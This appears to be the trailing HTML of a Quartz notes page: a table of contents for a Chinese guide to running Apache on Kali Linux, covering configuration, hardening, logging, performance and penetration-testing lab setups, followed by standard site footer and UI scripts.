                s-2-0.897-2-2s0.897-2,2-2S47,39.897,47,41z M49,10c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S51.206,10,49,10z"></path></svg></button></div><div class="global-graph-outer"><div class="global-graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:-1,&quot;scale&quot;:0.9,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.2,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:true,&quot;enableRadial&quot;:true}"></div></div></div><div class="toc desktop-only"><button type="button" class="toc-header" aria-controls="toc-14" aria-expanded="true"><h3>Table of Contents</h3><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><ul id="list-1" class="toc-content overflow"><li class="depth-0"><a href="#kali-linux中apache完整使用指南" data-for="kali-linux中apache完整使用指南">Kali Linux中Apache完整使用指南</a></li><li class="depth-1"><a href="#一apache简介与用途" data-for="一apache简介与用途">一、Apache简介与用途</a></li><li class="depth-2"><a href="#在kali-linux中的应用场景" data-for="在kali-linux中的应用场景">在Kali Linux中的应用场景</a></li><li class="depth-1"><a href="#二安装与基础配置" data-for="二安装与基础配置">二、安装与基础配置</a></li><li class="depth-2"><a href="#1-安装apache2" data-for="1-安装apache2">1. 安装Apache2</a></li><li class="depth-2"><a href="#2-基本服务管理" data-for="2-基本服务管理">2. 基本服务管理</a></li><li class="depth-2"><a href="#3-快速验证" data-for="3-快速验证">3. 快速验证</a></li><li class="depth-1"><a href="#三目录结构与配置文件" data-for="三目录结构与配置文件">三、目录结构与配置文件</a></li><li class="depth-2"><a href="#重要目录说明" data-for="重要目录说明">重要目录说明</a></li><li class="depth-2"><a href="#配置文件加载顺序" data-for="配置文件加载顺序">配置文件加载顺序</a></li><li class="depth-1"><a href="#四基础配置操作" data-for="四基础配置操作">四、基础配置操作</a></li><li class="depth-2"><a href="#1-修改默认端口" data-for="1-修改默认端口">1. 修改默认端口</a></li><li class="depth-2"><a href="#2-配置虚拟主机基于域名" data-for="2-配置虚拟主机基于域名">2. 配置虚拟主机（基于域名）</a></li><li class="depth-2"><a href="#3-基于ip的虚拟主机" data-for="3-基于ip的虚拟主机">3. 基于IP的虚拟主机</a></li><li class="depth-2"><a href="#4-基于端口的虚拟主机" data-for="4-基于端口的虚拟主机">4. 基于端口的虚拟主机</a></li><li class="depth-1"><a href="#五安全配置" data-for="五安全配置">五、安全配置</a></li><li class="depth-2"><a href="#1-隐藏apache版本和系统信息" data-for="1-隐藏apache版本和系统信息">1. 隐藏Apache版本和系统信息</a></li><li class="depth-2"><a href="#2-目录访问控制" data-for="2-目录访问控制">2. 目录访问控制</a></li><li class="depth-2"><a href="#3-基于密码的访问控制" data-for="3-基于密码的访问控制">3. 基于密码的访问控制</a></li><li class="depth-2"><a href="#4-文件和目录安全" data-for="4-文件和目录安全">4. 文件和目录安全</a></li><li class="depth-2"><a href="#5-防止点击劫持和xss" data-for="5-防止点击劫持和xss">5. 防止点击劫持和XSS</a></li><li class="depth-2"><a href="#6-限制请求大小和超时" data-for="6-限制请求大小和超时">6. 限制请求大小和超时</a></li><li class="depth-1"><a href="#六常用模块配置" data-for="六常用模块配置">六、常用模块配置</a></li><li class="depth-2"><a href="#1-url重写模块mod_rewrite" data-for="1-url重写模块mod_rewrite">1. URL重写模块（mod_rewrite）</a></li><li class="depth-2"><a href="#2-ssltls配置" data-for="2-ssltls配置">2. SSL/TLS配置</a></li><li class="depth-2"><a href="#3-php支持" data-for="3-php支持">3. PHP支持</a></li><li class="depth-2"><a href="#4-代理模块反向代理" data-for="4-代理模块反向代理">4. 代理模块（反向代理）</a></li><li class="depth-2"><a href="#5-其他有用模块" data-for="5-其他有用模块">5. 其他有用模块</a></li><li class="depth-1"><a href="#七日志管理与监控" data-for="七日志管理与监控">七、日志管理与监控</a></li><li class="depth-2"><a href="#1-日志文件说明" data-for="1-日志文件说明">1. 日志文件说明</a></li><li class="depth-2"><a href="#2-日志格式配置" data-for="2-日志格式配置">2. 日志格式配置</a></li><li class="depth-2"><a href="#3-日志分析" data-for="3-日志分析">3. 日志分析</a></li><li class="depth-2"><a href="#4-使用日志分析工具" data-for="4-使用日志分析工具">4. 使用日志分析工具</a></li><li class="depth-2"><a href="#5-日志轮换配置" data-for="5-日志轮换配置">5. 日志轮换配置</a></li><li class="depth-2"><a href="#6-错误日志级别" data-for="6-错误日志级别">6. 错误日志级别</a></li><li class="depth-1"><a href="#八性能优化" data-for="八性能优化">八、性能优化</a></li><li class="depth-2"><a href="#1-启用压缩" data-for="1-启用压缩">1. 启用压缩</a></li><li class="depth-2"><a href="#2-配置缓存" data-for="2-配置缓存">2. 配置缓存</a></li><li class="depth-2"><a href="#3-优化mpm多处理模块" data-for="3-优化mpm多处理模块">3. 优化MPM（多处理模块）</a></li><li class="depth-2"><a href="#4-启用http2" data-for="4-启用http2">4. 启用HTTP/2</a></li><li class="depth-2"><a href="#5-keepalive优化" data-for="5-keepalive优化">5. KeepAlive优化</a></li><li class="depth-2"><a href="#6-禁用不必要的模块" data-for="6-禁用不必要的模块">6. 禁用不必要的模块</a></li><li class="depth-2"><a href="#7-资源限制配置" data-for="7-资源限制配置">7. 资源限制配置</a></li><li class="depth-1"><a href="#九故障排查" data-for="九故障排查">九、故障排查</a></li><li class="depth-2"><a href="#1-配置测试命令" data-for="1-配置测试命令">1. 配置测试命令</a></li><li class="depth-2"><a href="#2-端口和进程检查" data-for="2-端口和进程检查">2. 端口和进程检查</a></li><li class="depth-2"><a href="#3-权限问题排查" data-for="3-权限问题排查">3. 权限问题排查</a></li><li class="depth-2"><a href="#4-日志实时监控" data-for="4-日志实时监控">4. 日志实时监控</a></li><li class="depth-2"><a href="#5-常见问题及解决方案" data-for="5-常见问题及解决方案">5. 常见问题及解决方案</a></li><li class="depth-2"><a href="#6-性能诊断" data-for="6-性能诊断">6. 性能诊断</a></li><li class="depth-2"><a href="#7-调试技巧" data-for="7-调试技巧">7. 调试技巧</a></li><li class="depth-1"><a href="#十渗透测试应用场景" data-for="十渗透测试应用场景">十、渗透测试应用场景</a></li><li class="depth-2"><a href="#1-搭建dvwa测试环境" data-for="1-搭建dvwa测试环境">1. 搭建DVWA测试环境</a></li><li class="depth-2"><a href="#2-搭建webgoat环境" data-for="2-搭建webgoat环境">2. 搭建WebGoat环境</a></li><li class="depth-2"><a href="#3-托管payload文件服务器" data-for="3-托管payload文件服务器">3. 托管Payload文件服务器</a></li><li class="depth-2"><a href="#4-搭建钓鱼页面测试环境" data-for="4-搭建钓鱼页面测试环境">4. 搭建钓鱼页面测试环境</a></li><li class="depth-2"><a href="#5-搭建beefbrowser-exploitation-framework" data-for="5-搭建beefbrowser-exploitation-framework">5. 搭建BeEF（Browser Exploitation Framework）</a></li><li class="depth-2"><a href="#6-配置ssl中间人测试环境" data-for="6-配置ssl中间人测试环境">6. 配置SSL中间人测试环境</a></li><li class="depth-2"><a href="#7-文件上传漏洞测试环境" data-for="7-文件上传漏洞测试环境">7. 文件上传漏洞测试环境</a></li><li class="depth-2"><a href="#8-sql注入测试环境" data-for="8-sql注入测试环境">8. SQL注入测试环境</a></li><li class="depth-2"><a href="#9-xss测试环境" data-for="9-xss测试环境">9. XSS测试环境</a></li><li class="depth-2"><a href="#10-命令注入测试环境" data-for="10-命令注入测试环境">10. 命令注入测试环境</a></li><li class="depth-1"><a href="#十一高级配置" data-for="十一高级配置">十一、高级配置</a></li><li class="depth-2"><a href="#1-配置反向代理负载均衡" data-for="1-配置反向代理负载均衡">1. 配置反向代理负载均衡</a></li><li class="depth-2"><a href="#2-websocket代理配置" data-for="2-websocket代理配置">2. WebSocket代理配置</a></li><li class="depth-2"><a href="#3-配置ip地理位置阻止" data-for="3-配置ip地理位置阻止">3. 配置IP地理位置阻止</a></li><li class="depth-2"><a href="#4-配置modsecurity-waf" data-for="4-配置modsecurity-waf">4. 配置ModSecurity WAF</a></li><li class="depth-2"><a href="#5-配置访问频率限制" data-for="5-配置访问频率限制">5. 配置访问频率限制</a></li><li class="depth-2"><a href="#6-配置自定义错误页面" data-for="6-配置自定义错误页面">6. 配置自定义错误页面</a></li><li class="depth-1"><a href="#十二安全加固清单" data-for="十二安全加固清单">十二、安全加固清单</a></li><li class="depth-2"><a href="#生产环境安全检查表" data-for="生产环境安全检查表">生产环境安全检查表</a></li><li class="depth-1"><a href="#十三备份与恢复" data-for="十三备份与恢复">十三、备份与恢复</a></li><li class="depth-2"><a href="#备份脚本" data-for="备份脚本">备份脚本</a></li><li class="depth-1"><a href="#十四配置文件详细讲解" data-for="十四配置文件详细讲解">十四、配置文件详细讲解</a></li><li class="depth-2"><a href="#1-apache2conf---主配置文件" data-for="1-apache2conf---主配置文件">1. apache2.conf - 主配置文件</a></li><li class="depth-2"><a href="#2-portsconf---端口配置文件" data-for="2-portsconf---端口配置文件">2. ports.conf - 端口配置文件</a></li><li class="depth-2"><a href="#3-envvars---环境变量文件" data-for="3-envvars---环境变量文件">3. envvars - 环境变量文件</a></li><li class="depth-2"><a href="#4-虚拟主机配置文件详解" data-for="4-虚拟主机配置文件详解">4. 虚拟主机配置文件详解</a></li><li class="depth-2"><a href="#41-000-defaultconf---默认http站点" data-for="41-000-defaultconf---默认http站点">4.1 000-default.conf - 默认HTTP站点</a></li><li class="depth-2"><a href="#5-模块配置文件详解" data-for="5-模块配置文件详解">5. 模块配置文件详解</a></li><li class="depth-2"><a href="#6-htaccess文件详解" data-for="6-htaccess文件详解">6. .htaccess文件详解</a></li><li class="depth-2"><a href="#7-mpm配置文件详解" data-for="7-mpm配置文件详解">7. MPM配置文件详解</a></li><li class="depth-2"><a href="#8-性能调优参数总结" data-for="8-性能调优参数总结">8. 性能调优参数总结</a></li><li class="depth-2"><a href="#81-全局性能参数apache2conf" data-for="81-全局性能参数apache2conf">8.1 全局性能参数（apache2.conf）</a></li><li class="depth-2"><a href="#9-安全配置参数详解" data-for="9-安全配置参数详解">9. 安全配置参数详解</a></li><li class="depth-2"><a href="#10-故障排查配置参数" data-for="10-故障排查配置参数">10. 故障排查配置参数</a></li><li class="depth-2"><a href="#11-配置文件验证与测试" data-for="11-配置文件验证与测试">11. 配置文件验证与测试</a></li><li class="depth-2"><a href="#12-配置文件最佳实践" data-for="12-配置文件最佳实践">12. 配置文件最佳实践</a></li><li class="depth-2"><a href="#13-常见配置错误与解决" data-for="13-常见配置错误与解决">13. 常见配置错误与解决</a></li><li class="depth-2"><a href="#错误1配置语法错误" data-for="错误1配置语法错误">错误1：配置语法错误</a></li><li class="depth-2"><a href="#错误2模块未加载" data-for="错误2模块未加载">错误2：模块未加载</a></li><li class="depth-2"><a href="#错误3端口冲突" data-for="错误3端口冲突">错误3：端口冲突</a></li><li class="depth-2"><a href="#错误4权限问题" data-for="错误4权限问题">错误4：权限问题</a></li><li class="overflow-end"></li></ul></div><div class="backlinks"><h3>Backlinks</h3><ul id="list-2" class="overflow"><li><a href="../../Linux/命令行工具/httpd" class="internal">httpd</a></li><li class="overflow-end"></li></ul></div></div><footer class><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v4.5.1</a> © 2025</p><ul><li><a href="https://github.com/jackyzha0/quartz">GitHub</a></li><li><a href="https://discord.gg/cRFFHYye7t">Discord Community</a></li></ul></footer></div></div></body><script type="application/javascript">function n(){let t=this.parentElement;t.classList.toggle("is-collapsed");let e=t.getElementsByClassName("callout-content")[0];if(!e)return;let l=t.classList.contains("is-collapsed");e.style.gridTemplateRows=l?"0fr":"1fr"}function c(){let t=document.getElementsByClassName("callout is-collapsible");for(let e of t){let l=e.getElementsByClassName("callout-title")[0],s=e.getElementsByClassName("callout-content")[0];if(!l||!s)continue;l.addEventListener("click",n),window.addCleanup(()=>l.removeEventListener("click",n));let o=e.classList.contains("is-collapsed");s.style.gridTemplateRows=o?"0fr":"1fr"}}document.addEventListener("nav",c);
</script><script type="module">function f(i,e){if(!i)return;function r(o){o.target===this&&(o.preventDefault(),o.stopPropagation(),e())}function t(o){o.key.startsWith("Esc")&&(o.preventDefault(),e())}i?.addEventListener("click",r),window.addCleanup(()=>i?.removeEventListener("click",r)),document.addEventListener("keydown",t),window.addCleanup(()=>document.removeEventListener("keydown",t))}function y(i){for(;i.firstChild;)i.removeChild(i.firstChild)}var h=class{constructor(e,r){this.container=e;this.content=r;this.setupEventListeners(),this.setupNavigationControls(),this.resetTransform()}isDragging=!1;startPan={x:0,y:0};currentPan={x:0,y:0};scale=1;MIN_SCALE=.5;MAX_SCALE=3;cleanups=[];setupEventListeners(){let e=this.onMouseDown.bind(this),r=this.onMouseMove.bind(this),t=this.onMouseUp.bind(this),o=this.resetTransform.bind(this);this.container.addEventListener("mousedown",e),document.addEventListener("mousemove",r),document.addEventListener("mouseup",t),window.addEventListener("resize",o),this.cleanups.push(()=>this.container.removeEventListener("mousedown",e),()=>document.removeEventListener("mousemove",r),()=>document.removeEventListener("mouseup",t),()=>window.removeEventListener("resize",o))}cleanup(){for(let e of this.cleanups)e()}setupNavigationControls(){let e=document.createElement("div");e.className="mermaid-controls";let r=this.createButton("+",()=>this.zoom(.1)),t=this.createButton("-",()=>this.zoom(-.1)),o=this.createButton("Reset",()=>this.resetTransform());e.appendChild(t),e.appendChild(o),e.appendChild(r),this.container.appendChild(e)}createButton(e,r){let t=document.createElement("button");return t.textContent=e,t.className="mermaid-control-button",t.addEventListener("click",r),window.addCleanup(()=>t.removeEventListener("click",r)),t}onMouseDown(e){e.button===0&&(this.isDragging=!0,this.startPan={x:e.clientX-this.currentPan.x,y:e.clientY-this.currentPan.y},this.container.style.cursor="grabbing")}onMouseMove(e){this.isDragging&&(e.preventDefault(),this.currentPan={x:e.clientX-this.startPan.x,y:e.clientY-this.startPan.y},this.updateTransform())}onMouseUp(){this.isDragging=!1,this.container.style.cursor="grab"}zoom(e){let r=Math.min(Math.max(this.scale+e,this.MIN_SCALE),this.MAX_SCALE),t=this.content.getBoundingClientRect(),o=t.width/2,n=t.height/2,c=r-this.scale;this.currentPan.x-=o*c,this.currentPan.y-=n*c,this.scale=r,this.updateTransform()}updateTransform(){this.content.style.transform=`translate(${this.currentPan.x}px, ${this.currentPan.y}px) scale(${this.scale})`}resetTransform(){this.scale=1;let e=this.content.querySelector("svg");this.currentPan={x:e.getBoundingClientRect().width/2,y:e.getBoundingClientRect().height/2},this.updateTransform()}},C=["--secondary","--tertiary","--gray","--light","--lightgray","--highlight","--dark","--darkgray","--codeFont"],E;document.addEventListener("nav",async()=>{let e=document.querySelector(".center").querySelectorAll("code.mermaid");if(e.length===0)return;E||=await import("https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.4.0/mermaid.esm.min.mjs");let r=E.default,t=new WeakMap;for(let n of e)t.set(n,n.innerText);async function o(){for(let s of e){s.removeAttribute("data-processed");let a=t.get(s);a&&(s.innerHTML=a)}let n=C.reduce((s,a)=>(s[a]=window.getComputedStyle(document.documentElement).getPropertyValue(a),s),{}),c=document.documentElement.getAttribute("saved-theme")==="dark";r.initialize({startOnLoad:!1,securityLevel:"loose",theme:c?"dark":"base",themeVariables:{fontFamily:n["--codeFont"],primaryColor:n["--light"],primaryTextColor:n["--darkgray"],primaryBorderColor:n["--tertiary"],lineColor:n["--darkgray"],secondaryColor:n["--secondary"],tertiaryColor:n["--tertiary"],clusterBkg:n["--light"],edgeLabelBackground:n["--highlight"]}}),await r.run({nodes:e})}await o(),document.addEventListener("themechange",o),window.addCleanup(()=>document.removeEventListener("themechange",o));for(let n=0;n<e.length;n++){let v=function(){let g=l.querySelector("#mermaid-space"),m=l.querySelector(".mermaid-content");if(!m)return;y(m);let w=c.querySelector("svg").cloneNode(!0);m.appendChild(w),l.classList.add("active"),g.style.cursor="grab",u=new h(g,m)},M=function(){l.classList.remove("active"),u?.cleanup(),u=null},c=e[n],s=c.parentElement,a=s.querySelector(".clipboard-button"),d=s.querySelector(".expand-button"),p=window.getComputedStyle(a),L=a.offsetWidth+parseFloat(p.marginLeft||"0")+parseFloat(p.marginRight||"0");d.style.right=`calc(${L}px + 0.3rem)`,s.prepend(d);let l=s.querySelector("#mermaid-container");if(!l)return;let u=null;d.addEventListener("click",v),f(l,M),window.addCleanup(()=>{u?.cleanup(),d.removeEventListener("click",v)})}});
</script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/copy-tex.min.js" type="application/javascript"></script><script src="../../postscript.js" type="module"></script></html>